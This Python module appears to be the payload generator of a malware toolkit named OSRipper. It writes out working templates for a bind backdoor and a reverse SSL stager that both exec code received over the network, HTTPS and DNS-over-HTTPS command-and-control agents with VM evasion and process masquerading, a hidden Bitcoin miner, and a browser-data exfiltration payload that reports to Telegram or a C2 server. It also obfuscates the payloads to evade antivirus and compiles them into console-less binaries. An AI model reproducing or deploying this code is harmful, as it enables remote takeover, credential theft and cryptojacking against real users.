#!/usr/bin/env python3
"""
OSRipper Generator Module
Centralizes payload generation, obfuscation, and compilation with automatic cleanup
"""

import os
import sys
import shutil
import tempfile
import platform
import subprocess
from pathlib import Path
import secrets
import string
import random
from . import obfuscator
from . import obfuscator_enhanced

# ============================================================================
# Payload Template Generation Functions
# ============================================================================

def generate_random_string(length):
    """Generate random string for obfuscation."""
    return "".join(secrets.choice(string.ascii_letters) for _ in range(length))


def create_bind_payload(port, output_name="payload", stealth_delay=False):
    """
    Generate bind backdoor payload.
    
    Args:
        port: Port to bind to
        output_name: Name of output file
        stealth_delay: If True, add random delay (5-15 seconds) at startup
    
    Returns:
        str: Path to generated payload file
    """
    stealth_code = ""
    if stealth_delay:
        stealth_code = """import time
import random
time.sleep(random.randint(5, 15))

"""
    
    payload_content = f"""{stealth_code}port = {port}

import zlib
import base64
import socket
import struct
import time

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', int(port)))
        s.listen(1)
        client, addr = s.accept()
        
        length = struct.unpack('>I', client.recv(4))[0]
        data = client.recv(length)
        
        while len(data) < length:
            data += client.recv(length - len(data))
        
        exec(zlib.decompress(base64.b64decode(data)), {{'s': client}})
        
    except Exception:
        time.sleep(10)
        main()

if __name__ == "__main__":
    main()
"""
    
    with open(output_name, 'w') as f:
        f.write(payload_content)
    
    return output_name


def create_reverse_ssl_tcp_payload(host, port, output_name="payload", stealth_delay=False):
    """
    Generate reverse SSL TCP meterpreter payload.
    
    Args:
        host: Callback IP address
        port: Callback port
        output_name: Name of output file
        stealth_delay: If True, add random delay (5-15 seconds) at startup
    
    Returns:
        str: Path to generated payload file
    """
    # Generate randomized variables
    socket_var = generate_random_string(random.randint(8, 15))
    ssl_var = generate_random_string(random.randint(8, 15))
    length_var = generate_random_string(random.randint(8, 15))
    data_var = generate_random_string(random.randint(8, 15))
    context_var = generate_random_string(random.randint(8, 15))
    host_var = generate_random_string(random.randint(8, 15))
    port_var = generate_random_string(random.randint(8, 15))
    
    stealth_code = ""
    if stealth_delay:
        stealth_code = """import time
import random
time.sleep(random.randint(15, 50))

"""
    
    payload_content = f"""{stealth_code}{port_var} = {port}
{host_var} = "{host}"

import zlib,base64,ssl,socket,struct,time
{ssl_var} = None
for x in range(10):
        try:
                {socket_var}=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                {socket_var}.settimeout(5)
                {socket_var}.connect(({host_var},{port_var}))
                {context_var} = ssl._create_unverified_context()
                {ssl_var}={context_var}.wrap_socket({socket_var})
                break
        except Exception as e:
                time.sleep(2)
if {ssl_var} is None:
        exit(1)
{length_var}=struct.unpack('>I',{ssl_var}.recv(4))[0]
{data_var}={ssl_var}.recv({length_var})
while len({data_var})<{length_var}:
        {data_var}+={ssl_var}.recv({length_var}-len({data_var}))
exec(zlib.decompress(base64.b64decode({data_var})),{{'s':{ssl_var}}})
"""
    
    with open(output_name, 'w') as f:
        f.write(payload_content)
    
    return output_name


def create_custom_payload(script_path, output_name="payload", stealth_delay=False):
    """
    Copy custom script as payload.
    
    Args:
        script_path: Path to source Python script
        output_name: Name of output file
        stealth_delay: If True, add random delay (5-15 seconds) at startup
    
    Returns:
        str: Path to generated payload file
    """
    stealth_code = ""
    if stealth_delay:
        stealth_code = """import time
import random
time.sleep(random.randint(5, 15))

"""
    
    with open(script_path, 'r') as source:
        with open(output_name, 'w') as target:
            target.write(stealth_code)
            target.write(source.read())
    
    return output_name


def create_https_payload(base_url, output_name="payload", stealth_delay=False, cert_fingerprint=None, skip_vm_checks=False):
    """
    Generate HTTPS C2 payload with certificate pinning.
    
    Args:
        base_url: C2 server base URL (e.g., "https://example.com")
        output_name: Name of output file
        stealth_delay: If True, add random delay (5-15 seconds) at startup
        cert_fingerprint: Certificate SHA256 fingerprint for pinning (optional)
        skip_vm_checks: If True, skip VM detection checks (for testing)
    
    Returns:
        str: Path to generated payload file
    """
    stealth_code = ""
    if stealth_delay:
        stealth_code = """import time
import random
time.sleep(random.randint(5, 15))

"""
    
    # Read agent modules and embed them
    agent_dir = os.path.join(os.path.dirname(__file__), 'agent')
    
    # Read all agent modules
    modules_code = {}
    for module_file in ['https_client.py', 'stealth.py', 'executor.py', 'session.py']:
        module_path = os.path.join(agent_dir, module_file)
        if os.path.exists(module_path):
            with open(module_path, 'r') as f:
                content = f.read()
                # Remove shebang if present
                if content.startswith('#!/'):
                    content = content.split('\n', 1)[1]
                # Remove module docstring (handle multi-line docstrings)
                lines = content.split('\n')
                # Find docstring start (look for """ in any of the first few lines)
                doc_start = -1
                doc_end = -1
                for i, line in enumerate(lines[:10]):  # Check first 10 lines
                    if '"""' in line:
                        if doc_start == -1:
                            doc_start = i
                        else:
                            doc_end = i + 1
                            break
                if doc_start >= 0 and doc_end > doc_start:
                    # Remove docstring lines
                    content = '\n'.join(lines[:doc_start] + lines[doc_end:])
                elif doc_start >= 0:
                    # Single line docstring or unclosed, just remove that line
                    content = '\n'.join(lines[:doc_start] + lines[doc_start+1:])
                modules_code[module_file] = content
    
    cert_pin_code = f', cert_fingerprint="{cert_fingerprint}"' if cert_fingerprint else ''
    
    # Build embedded payload
    payload_content = f"""{stealth_code}# OSRipper HTTPS Agent Payload (Embedded)
import base64
import json
import random
import time
import urllib.request
import urllib.parse
import ssl
import socket
import hashlib
import os
import sys
import platform
import subprocess
import psutil
import secrets

# Embedded HTTPS Client Module
{modules_code.get('https_client.py', '# HTTPS client code not found')}

# Embedded Stealth Module  
{modules_code.get('stealth.py', '# Stealth module code not found')}

# Embedded Executor Module
{modules_code.get('executor.py', '# Executor module code not found')}

# Embedded Session Module
{modules_code.get('session.py', '# Session module code not found')}

# Main Agent Code
class Agent:
    def __init__(self, base_url, stealth_delay=False, cert_fingerprint=None):
        self.base_url = base_url
        self.stealth_delay = stealth_delay
        self.cert_fingerprint = cert_fingerprint
        self.skip_vm_checks = {skip_vm_checks}
        self.stealth = Stealth(skip_vm_checks={skip_vm_checks})
        self.session_manager = SessionManager()
        self.executor = CommandExecutor()
        self.https_client = None
        self.running = False
        self.system_info_sent = False  # Track if we've sent system info
        self.is_windows = platform.system() == 'Windows'
    
    def _debug_print(self, message):
        # Debug statements disabled
        pass
    
    def initialize(self):
        self._debug_print("[*] Initializing agent...")
        if self.stealth_delay:
            self._debug_print("[*] Adding stealth delay...")
            self.stealth.add_delay(5, 15)
        self._debug_print("[*] Running stealth checks...")
        if not self.stealth.check_all():
            self._debug_print("[!] Stealth checks failed, exiting")
            sys.exit(1)
        self._debug_print("[+] Stealth checks passed")
        self.stealth.masquerade_process()
        self._debug_print("[*] Loading session...")
        session_id = self.session_manager.load_session()
        if not session_id:
            self._debug_print("[*] No existing session, creating new one...")
            session_id = self.session_manager.create_session()
        else:
            self._debug_print("[+] Loaded existing session: " + session_id[:16] + "...")
        self._debug_print("[*] Creating HTTPS client with base_url: " + self.base_url)
        self.https_client = HTTPSClient(base_url=self.base_url, session_id=session_id, cert_fingerprint=self.cert_fingerprint)
        
        # Collect system information
        try:
            self.hostname = platform.node()
            self.username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
            self.platform_info = platform.platform()
        except Exception:
            self.hostname = 'unknown'
            self.username = 'unknown'
            self.platform_info = 'unknown'
        
        self._debug_print("[+] Agent initialized successfully")
        return True
    
    def run(self):
        self._debug_print("[*] Starting agent run loop...")
        if not self.initialize():
            self._debug_print("[!] Initialization failed")
            return
        self.running = True
        self._debug_print("[+] Agent running, entering main loop...")
        loop_count = 0
        while self.running:
            try:
                loop_count += 1
                self._debug_print("[*] Loop iteration " + str(loop_count))
                # Send system info only on first beacon
                if not self.system_info_sent:
                    command = self.https_client.get_command(
                        hostname=self.hostname,
                        username=self.username,
                        platform_info=self.platform_info
                    )
                    self.system_info_sent = True
                else:
                    command = self.https_client.get_command()
                if command:
                    self._debug_print("[+] Processing command: " + str(command))
                    self._process_command(command)
                    self.session_manager.update_contact()
                else:
                    self._debug_print("[*] No command received")
                    self.stealth.randomize_timing()
                delay = self.https_client.get_polling_delay()
                self._debug_print("[*] Sleeping for " + str(delay) + " seconds...")
                time.sleep(delay)
            except KeyboardInterrupt:
                self._debug_print("[*] Keyboard interrupt received, shutting down...")
                self.running = False
                break
            except Exception as e:
                self._debug_print("[!] Exception in run loop: " + str(e))
                import traceback
                traceback.print_exc()
                self.session_manager.increment_reconnect()
                reconnect_delay = self.session_manager.get_reconnect_delay()
                self._debug_print("[*] Reconnecting in " + str(reconnect_delay) + " seconds...")
                time.sleep(reconnect_delay)
    
    def _process_command(self, command):
        try:
            if command == '__TERMINATE__':
                # Session was deleted - terminate and clean up
                self.session_manager.clear_session()
                self.running = False
                sys.exit(0)
            elif command == 'exit':
                self.running = False
                return
            elif command == 'ping':
                self.https_client.send_response('pong')
                return
            result = self.executor.execute(command)
            response = self.executor.format_response(result)
            self.https_client.send_response(response)
        except Exception:
            error_response = "STDERR:Command execution failed"
            self.https_client.send_response(error_response)

if __name__ == "__main__":
    print("[*] OSRipper HTTPS Agent starting...")
    base_url = "{base_url}"
    stealth_delay = {str(stealth_delay)}
    cert_fingerprint = {f'"{cert_fingerprint}"' if cert_fingerprint else 'None'}
    skip_vm_checks = {skip_vm_checks}
    if platform.system() == 'Windows':
        print(f"[*] Configuration - Base URL: " + base_url + ", Stealth Delay: " + str(stealth_delay) + ", Cert Fingerprint: " + str(cert_fingerprint) + ", Skip VM Checks: " + str(skip_vm_checks))
    agent = Agent(base_url=base_url, stealth_delay=stealth_delay, cert_fingerprint=cert_fingerprint)
    agent.run()
"""
    
    with open(output_name, 'w') as f:
        f.write(payload_content)
    
    return output_name


def create_doh_payload(domain, output_name="payload", stealth_delay=False, skip_vm_checks=False):
    """
    Generate DNS-over-HTTPS C2 payload.
    
    Args:
        domain: C2 domain name
        output_name: Name of output file
        stealth_delay: If True, add random delay (5-15 seconds) at startup
        skip_vm_checks: If True, skip VM detection checks (for testing)
    
    Returns:
        str: Path to generated payload file
    """
    stealth_code = ""
    if stealth_delay:
        stealth_code = """import time
import random
time.sleep(random.randint(5, 15))

"""
    
    # Read agent modules and embed them
    agent_dir = os.path.join(os.path.dirname(__file__), 'agent')
    
    # Read all agent modules
    modules_code = {}
    for module_file in ['doh_client.py', 'stealth.py', 'executor.py', 'session.py']:
        module_path = os.path.join(agent_dir, module_file)
        if os.path.exists(module_path):
            with open(module_path, 'r') as f:
                content = f.read()
                # Remove shebang if present
                if content.startswith('#!/'):
                    content = content.split('\n', 1)[1]
                # Remove module docstring (triple-quoted string at start)
                lines = content.split('\n')
                if lines and '"""' in lines[0]:
                    # Find end of docstring
                    doc_end = 0
                    for i, line in enumerate(lines):
                        if i > 0 and '"""' in line:
                            doc_end = i + 1
                            break
                    content = '\n'.join(lines[doc_end:])
                modules_code[module_file] = content
    
    # Build embedded payload
    payload_content = f"""{stealth_code}# OSRipper DoH Agent Payload (Embedded)
import base64
import json
import random
import time
import urllib.parse
import urllib.request
import ssl
import os
import sys
import platform
import subprocess
import psutil
import secrets

# Embedded DoH Client Module
{modules_code.get('doh_client.py', '# DoH client code not found')}

# Embedded Stealth Module  
{modules_code.get('stealth.py', '# Stealth module code not found')}

# Embedded Executor Module
{modules_code.get('executor.py', '# Executor module code not found')}

# Embedded Session Module
{modules_code.get('session.py', '# Session module code not found')}

# Main Agent Code
class Agent:
    def __init__(self, domain, stealth_delay=False, doh_endpoint=None):
        self.domain = domain
        self.stealth_delay = stealth_delay
        self.doh_endpoint = doh_endpoint
        self.skip_vm_checks = {skip_vm_checks}
        self.stealth = Stealth(skip_vm_checks={skip_vm_checks})
        self.session_manager = SessionManager()
        self.executor = CommandExecutor()
        self.doh_client = None
        self.running = False
        self.is_windows = platform.system() == 'Windows'
    
    def _debug_print(self, message):
        # Debug statements disabled
        pass
    
    def initialize(self):
        self._debug_print("[*] Initializing agent...")
        if self.stealth_delay:
            self._debug_print("[*] Adding stealth delay...")
            self.stealth.add_delay(5, 15)
        self._debug_print("[*] Running stealth checks...")
        if not self.stealth.check_all():
            self._debug_print("[!] Stealth checks failed, exiting")
            sys.exit(1)
        self._debug_print("[+] Stealth checks passed")
        self.stealth.masquerade_process()
        self._debug_print("[*] Loading session...")
        session_id = self.session_manager.load_session()
        if not session_id:
            self._debug_print("[*] No existing session, creating new one...")
            session_id = self.session_manager.create_session()
        else:
            self._debug_print("[+] Loaded existing session: " + session_id[:16] + "...")
        self.doh_client = DoHClient(domain=self.domain, session_id=session_id, doh_endpoint=self.doh_endpoint)
        self._debug_print("[+] Agent initialized successfully")
        return True
    
    def run(self):
        self._debug_print("[*] Starting agent run loop...")
        if not self.initialize():
            self._debug_print("[!] Initialization failed")
            return
        self.running = True
        self._debug_print("[+] Agent running, entering main loop...")
        loop_count = 0
        while self.running:
            try:
                loop_count += 1
                self._debug_print("[*] Loop iteration " + str(loop_count))
                command = self.doh_client.get_command()
                if command:
                    self._debug_print("[+] Processing command: " + str(command))
                    self._process_command(command)
                    self.session_manager.update_contact()
                else:
                    self._debug_print("[*] No command received")
                    self.stealth.randomize_timing()
                delay = self.doh_client.get_polling_delay()
                self._debug_print("[*] Sleeping for " + str(delay) + " seconds...")
                time.sleep(delay)
            except KeyboardInterrupt:
                self._debug_print("[*] Keyboard interrupt received, shutting down...")
                self.running = False
                break
            except Exception as e:
                self._debug_print("[!] Exception in run loop: " + str(e))
                import traceback
                traceback.print_exc()
                self.session_manager.increment_reconnect()
                reconnect_delay = self.session_manager.get_reconnect_delay()
                self._debug_print("[*] Reconnecting in " + str(reconnect_delay) + " seconds...")
                time.sleep(reconnect_delay)
    
    def _process_command(self, command):
        try:
            if command == '__TERMINATE__':
                # Session was deleted - terminate and clean up
                self.session_manager.clear_session()
                self.running = False
                sys.exit(0)
            elif command == 'exit':
                self.running = False
                return
            elif command == 'ping':
                self.doh_client.send_response('pong')
                return
            result = self.executor.execute(command)
            response = self.executor.format_response(result)
            self.doh_client.send_response(response)
        except Exception:
            error_response = "STDERR:Command execution failed"
            self.doh_client.send_response(error_response)

if __name__ == "__main__":
    domain = "{domain}"
    stealth_delay = {str(stealth_delay)}
    skip_vm_checks = {skip_vm_checks}
    # Use C2 server's DoH endpoint
    doh_endpoint = f"https://{{domain}}/dns-query"
    agent = Agent(domain=domain, stealth_delay=stealth_delay, doh_endpoint=doh_endpoint)
    agent.run()
"""
    
    with open(output_name, 'w') as f:
        f.write(payload_content)
    
    return output_name


def create_btc_miner_payload(btc_address, output_name="payload", stealth_delay=False):
    """
    Generate Bitcoin miner payload.
    
    Args:
        btc_address: Bitcoin payout address
        output_name: Name of output file
        stealth_delay: If True, add random delay (5-15 seconds) at startup
    
    Returns:
        str: Path to generated payload file
    """
    stealth_code = ""
    if stealth_delay:
        stealth_code = """import time
import random
time.sleep(random.randint(5, 15))

"""
    
    miner_code = f'''{stealth_code}import socket
import json
import hashlib
import binascii
import time
import random

def main():
    address = "{btc_address}"
    nonce = hex(random.randint(0, 2**32-1))[2:].zfill(8)
    
    host = 'solo.ckpool.org'
    port = 3333
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Server connection
        sock.sendall(b'{{"id": 1, "method": "mining.subscribe", "params": []}}\n')
        lines = sock.recv(1024).decode().split('\\n')
        response = json.loads(lines[0])
        sub_details, extranonce1, extranonce2_size = response['result']
        
        # Authorize worker
        auth_msg = f'{{"params": ["{btc_address}", "password"], "id": 2, "method": "mining.authorize"}}\\n'
        sock.sendall(auth_msg.encode())
        
        # Mining loop
        response = b''
        while response.count(b'\\n') < 4 and not(b'mining.notify' in response):
            response += sock.recv(1024)
        
        responses = [json.loads(res) for res in response.decode().split('\\n') 
                    if len(res.strip()) > 0 and 'mining.notify' in res]
        
        if responses:
            job_id, prevhash, coinb1, coinb2, merkle_branch, version, nbits, ntime, clean_jobs = responses[0]['params']
            
            # Calculate target and mine
            target = (nbits[2:] + '00' * (int(nbits[:2], 16) - 3)).zfill(64)
            extranonce2 = '00' * extranonce2_size
            
            coinbase = coinb1 + extranonce1 + extranonce2 + coinb2
            coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()
            
            merkle_root = coinbase_hash_bin
            for h in merkle_branch:
                merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()
            
            merkle_root = binascii.hexlify(merkle_root).decode()
            merkle_root = ''.join([merkle_root[i:i+2] for i in range(0, len(merkle_root), 2)][::-1])
            
            blockheader = version + prevhash + merkle_root + nbits + ntime + nonce + \\
                '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'
            
            hash_result = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
            hash_hex = binascii.hexlify(hash_result).decode()
            
            if hash_hex < target:
                payload = f'{{"params": ["{btc_address}", "{{job_id}}", "{{extranonce2}}", "{{ntime}}", "{{nonce}}"], "id": 1, "method": "mining.submit"}}\\n'
                sock.sendall(payload.encode())
        
        sock.close()
        
    except Exception:
        time.sleep(10)
        main()

if __name__ == "__main__":
    while True:
        main()
'''
    
    with open(output_name, 'w') as f:
        f.write(miner_code)
    
    return output_name


def create_exfil_payload(target_platform, output_name="payload",
                         bot_token="", chat_id="",
                         c2_url="", c2_mode="telegram",
                         check_interval=3600, auto_persist=True,
                         root_mode=False, stealth_delay=False):
    """
    Generate a browser data extraction payload for the specified platform.

    Args:
        target_platform: One of 'windows', 'linux', 'wsl2', 'android'
        output_name: Output filename (without .py extension)
        bot_token: Telegram bot token (for telegram/dual mode)
        chat_id: Telegram chat ID (for telegram/dual mode)
        c2_url: OSRipper C2 server URL (for c2/dual mode)
        c2_mode: 'telegram', 'c2', or 'dual'
        check_interval: Auto-extraction interval in seconds (0 = disabled)
        auto_persist: Install persistence on first run
        root_mode: Android root mode
        stealth_delay: Add random startup delay

    Returns:
        str: Path to generated payload file
    """
    platform_map = {
        'windows': 'exfil_windows.py',
        'linux':   'exfil_linux.py',
        'wsl2':    'exfil_wsl.py',
        'wsl':     'exfil_wsl.py',
        'android': 'exfil_android.py',
    }
    template_name = platform_map.get(target_platform.lower())
    if not template_name:
        raise ValueError(f"Unknown platform: {target_platform}. "
                         f"Choose from: {', '.join(platform_map.keys())}")

    template_path = os.path.join(os.path.dirname(__file__), 'payloads', template_name)
    if not os.path.exists(template_path):
        raise FileNotFoundError(f"Template not found: {template_path}")

    with open(template_path, 'r', encoding='utf-8') as f:
        code = f.read()

    stealth_prefix = ""
    if stealth_delay:
        stealth_prefix = "import time, random\ntime.sleep(random.randint(5, 15))\n\n"

    code = code.replace('__BOTTOKEN__', bot_token or '')
    code = code.replace('__CHATID__', chat_id or '')
    code = code.replace('__C2URL__', c2_url or '')
    code = code.replace('__C2MODE__', c2_mode or 'telegram')
    code = code.replace('__CHECKINTERVAL__', str(int(check_interval)))
    code = code.replace('__AUTOPERSIST__', str(bool(auto_persist)))
    code = code.replace('__ROOTMODE__', str(bool(root_mode)))

    if stealth_prefix:
        code = stealth_prefix + code

    out_path = output_name if output_name.endswith('.py') else output_name
    with open(out_path, 'w', encoding='utf-8') as f:
        f.write(code)

    return out_path


class Generator:
    """
    Centralized generator for OSRipper payloads.
    Handles obfuscation, compilation, and cleanup in a temporary workspace.
    """
    
    def __init__(self, source_file, output_name="payload", icon_path=None, quiet=False):
        """
        Initialize the Generator.
        
        Args:
            source_file: Path to the source payload file
            output_name: Base name for output files (default: "payload")
            icon_path: Optional path to icon file for compiled binary
            quiet: If True, suppress output messages
        """
        self.source_file = source_file
        self.output_name = output_name
        self.icon_path = icon_path
        self.quiet = quiet
        
        # Generate unique temp directory name
        random_suffix = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(8))
        self.tmp_dir = os.path.join(tempfile.gettempdir(), f"osripper_build_{random_suffix}")
        
        # Track state
        self.obfuscated = False
        self.compiled = False
        self.obfuscated_file = None
        self.binary_file = None
        
        # Results directory (absolute so it's correct regardless of cwd later)
        self.results_dir = os.path.abspath(os.path.join(os.getcwd(), "results"))
        
    def _log(self, message):
        """Print message unless in quiet mode."""
        if not self.quiet:
            print(message)
    
    def _create_tmp_workspace(self):
        """Create temporary workspace directory."""
        try:
            os.makedirs(self.tmp_dir, exist_ok=True)
            self._log(f"[*] Created temporary workspace: {self.tmp_dir}")
            return True
        except Exception as e:
            print(f"[!] Failed to create temp workspace: {e}")
            return False
    
    def obfuscate(self, enhanced=False, random_suffix=False):
        """
        Obfuscate the payload using the obfuscator module.
        Runs in the source file's directory so output is always next to the source.

        Args:
            enhanced: If True, use enhanced obfuscator with anti-debug, VM detection, etc.
            random_suffix: If True, use a random output filename suffix to reduce AV filename signatures.

        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if enhanced:
                self._log("[*] Obfuscating payload with enhanced obfuscator (anti-debug, VM detection, etc.)...")
            else:
                self._log("[*] Obfuscating payload with basic obfuscator...")
            if random_suffix:
                self._log("[*] Using random output filename suffix for evasion")
            # Determine source file path (absolute so we know its directory)
            if self.obfuscated_file:
                source = self.obfuscated_file
            else:
                source = self.source_file
            source_abs = os.path.abspath(source)
            source_dir = os.path.dirname(source_abs)
            source_basename = os.path.basename(source_abs)
            if not os.path.exists(source_abs):
                print(f"[!] Source file not found: {source_abs}")
                return False
            orig_cwd = os.getcwd()
            try:
                if source_dir:
                    os.chdir(source_dir)
                if enhanced:
                    obfuscated_name = obfuscator_enhanced.MainMenu(source_basename, random_suffix=random_suffix)
                else:
                    obfuscated_name = obfuscator.MainMenu(source_basename, random_suffix=random_suffix)
            finally:
                os.chdir(orig_cwd)
            obfuscated_abs = os.path.join(source_dir, obfuscated_name)
            if os.path.exists(obfuscated_abs):
                self.obfuscated_file = obfuscated_abs
                self.obfuscated = True
                self._log(f"[+] Payload obfuscated: {obfuscated_name}")
                return True
            print("[!] Obfuscation failed - output file not found")
            return False
                
        except Exception as e:
            print(f"[!] Obfuscation error: {e}")
            return False
    
    def _check_compile_deps(self):
        """Check Nuitka/sandboxed are available; tell user to run osripper-cli setup if not."""
        from .venv_helper import get_venv_python
        python = get_venv_python()
        result = subprocess.run(
            [python, "-m", "nuitka", "--version"],
            capture_output=True,
            text=True,
        )
        if result.returncode != 0:
            err = (result.stderr or result.stdout or "").lower()
            if "no module named" in err or "nuitka" in err:
                print("[!] Nuitka is not installed. Run: osripper-cli setup")
            return False
        try:
            import sandboxed  # noqa: F401
        except ImportError:
            print("[!] The 'sandboxed' module is required for compilation. Run: osripper-cli setup")
            return False
        return True

    def compile(self):
        """
        Compile the payload to binary using Nuitka in the temp workspace.
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if not self._check_compile_deps():
                return False
            if not self._create_tmp_workspace():
                return False
            
            self._log("[*] Compiling payload to binary...")
            
            # Determine source file for compilation
            if self.obfuscated_file:
                source = self.obfuscated_file
            else:
                source = self.source_file
            
            if not os.path.exists(source):
                print(f"[!] Source file not found: {source}")
                return False
            
            # Get absolute paths
            source_abs = os.path.abspath(source)
            
            # Build Nuitka command (use venv python if setup was run)
            from .venv_helper import get_venv_python
            python = get_venv_python()
            cmd_parts = [
                python, "-m", "nuitka",
                "--standalone",
                "--include-module=sandboxed",
                "--disable-console",
                "--windows-disable-console",
                "--onefile",
                "--assume-yes-for-downloads",
                f"--output-dir={self.tmp_dir}"
            ]
            
            # Add platform-specific options
            system = platform.system()
            
            if system == "Darwin":
                cmd_parts.append("--macos-create-app-bundle")
                if self.icon_path and os.path.exists(self.icon_path):
                    cmd_parts.append(f"--macos-onefile-icon={os.path.abspath(self.icon_path)}")
            elif system == "Windows" or system == "Linux":
                if self.icon_path and os.path.exists(self.icon_path):
                    cmd_parts.append(f"--windows-icon-from-ico={os.path.abspath(self.icon_path)}")
            
            cmd_parts.append(source_abs)
            
            # Run compilation
            self._log(f"[*] Running Nuitka (this may take a few minutes)...")
            result = subprocess.run(
                cmd_parts,
                capture_output=True,
                text=True,
                cwd=self.tmp_dir
            )
            
            if result.returncode == 0:
                # Find the compiled binary
                binary_name = os.path.basename(source).replace('.py', '.bin')
                
                # Look for binary in tmp_dir
                possible_paths = [
                    os.path.join(self.tmp_dir, binary_name),
                    os.path.join(self.tmp_dir, os.path.basename(source).replace('.py', '')),
                    os.path.join(self.tmp_dir, os.path.basename(source).replace('.py', '.exe')),
                ]
                
                # Also check for .bin extension
                for root, dirs, files in os.walk(self.tmp_dir):
                    for file in files:
                        if file.endswith('.bin') or (file == os.path.basename(source).replace('.py', '')):
                            possible_paths.append(os.path.join(root, file))
                
                # Find the binary
                for path in possible_paths:
                    if os.path.exists(path) and os.path.isfile(path):
                        self.binary_file = path
                        break
                
                if self.binary_file:
                    self.compiled = True
                    self._log(f"[+] Compilation successful!")
                    return True
                else:
                    print("[!] Binary file not found after compilation")
                    print(f"[!] Searched in: {self.tmp_dir}")
                    return False
            else:
                print("[!] Compilation failed")
                err = (result.stderr or result.stdout or "")
                if "No module named" in err or "nuitka" in err:
                    print("[!] Run: osripper-cli setup")
                else:
                    print(f"[!] Error: {err[:500]}")
                return False
                
        except Exception as e:
            print(f"[!] Compilation error: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def cleanup_and_move_results(self):
        """
        Move final files to results/ directory and cleanup temp workspace.
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            self._log("[*] Moving results and cleaning up...")
            
            # Create results directory
            os.makedirs(self.results_dir, exist_ok=True)
            
            # Move obfuscated file if it exists (use absolute paths for robustness)
            if self.obfuscated_file and os.path.exists(self.obfuscated_file):
                dest = os.path.join(self.results_dir, os.path.basename(self.obfuscated_file))
                dest = os.path.abspath(dest)
                shutil.copy2(self.obfuscated_file, dest)
                self._log(f"[+] Moved obfuscated file to: {dest}")
                
                # Remove original obfuscated file from workspace
                try:
                    os.remove(self.obfuscated_file)
                except:
                    pass
            
            # Move binary if it exists
            if self.binary_file and os.path.exists(self.binary_file):
                # Rename to output_name.bin
                binary_dest = os.path.join(self.results_dir, f"{self.output_name}.bin")
                shutil.copy2(self.binary_file, binary_dest)
                self._log(f"[+] Moved binary to: {binary_dest}")
            
            # Clean up temp directory
            if os.path.exists(self.tmp_dir):
                shutil.rmtree(self.tmp_dir)
                self._log(f"[+] Cleaned up temporary workspace")
            
            # Clean up any other build artifacts in current directory
            artifacts = [
                f"{self.output_name}.build",
                f"{self.output_name}.dist",
                f"{self.output_name}.onefile-build",
            ]
            
            if self.obfuscated_file:
                base = os.path.basename(self.obfuscated_file).replace('.py', '')
                artifacts.extend([
                    f"{base}.build",
                    f"{base}.dist",
                    f"{base}.onefile-build",
                ])
            
            for artifact in artifacts:
                if os.path.exists(artifact):
                    if os.path.isdir(artifact):
                        shutil.rmtree(artifact)
                    else:
                        os.remove(artifact)
                    self._log(f"[+] Removed artifact: {artifact}")
            
            # Clean up source payload file from workspace root
            if os.path.exists(self.source_file):
                try:
                    os.remove(self.source_file)
                except:
                    pass
            
            self._log(f"[+] Results saved to: {self.results_dir}/")
            return True
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
            return False
    
    def generate(self, obfuscate=True, compile_binary=True, enhanced_obfuscation=False, randomize_output=False):
        """
        Main orchestrator method that runs all generation steps.

        Args:
            obfuscate: If True, obfuscate the payload
            compile_binary: If True, compile to binary
            enhanced_obfuscation: If True, use enhanced obfuscator (anti-debug, VM detection, etc.)
            randomize_output: If True, use random obfuscated filename suffix to reduce AV filename signatures.

        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Obfuscation step
            if obfuscate:
                if not self.obfuscate(enhanced=enhanced_obfuscation, random_suffix=randomize_output):
                    print("[!] Obfuscation failed")
                    return False
            
            # Compilation step
            if compile_binary:
                if not self.compile():
                    print("[!] Compilation failed")
                    return False
            
            # Cleanup and move results
            if not self.cleanup_and_move_results():
                print("[!] Cleanup failed")
                return False
            
            self._log("\n[+] Generation completed successfully!")
            self._log(f"[*] Check the '{self.results_dir}' directory for your files")
            
            return True
            
        except Exception as e:
            print(f"[!] Generation error: {e}")
            return False
        finally:
            # Ensure temp directory is cleaned up even on failure
            if os.path.exists(self.tmp_dir):
                try:
                    shutil.rmtree(self.tmp_dir)
                except:
                    pass

